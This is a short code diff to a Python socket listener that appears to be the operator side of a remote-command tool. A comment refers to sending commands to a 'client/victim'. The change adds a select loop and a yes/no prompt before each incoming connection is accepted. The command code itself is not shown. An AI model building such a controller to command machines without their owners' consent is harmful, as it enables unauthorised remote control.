@@ -36,10 +36,24 @@ def bind_socket():
 # Establish connection with a client (socket must be listening)
 
 def socket_accept():
-    conn, address = s.accept()
-    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
-    send_commands(conn)
-    conn.close()
+    global s
+    sockets_list = [s]
+    while True:
+        read_sockets, _, _ = select.select(sockets_list, [], [])
+
+        for notified_socket in read_sockets:
+            if notified_socket == s:
+                accept_connection = input("Do you want to accept the connection? (yes/no): ")
+                if accept_connection.lower() == "yes":
+                    conn, address = s.accept()
+                    print("Connection has been established! |" + " IP " + address[0] + " | Port" + str(address[1]))
+                    send_commands(conn)
+                    conn.close()
+                    return  
+
+                else:
+                    print("Connection not accepted.")
+                    return
 
 # Send commands to client/victim or a friend
 def send_commands(conn):
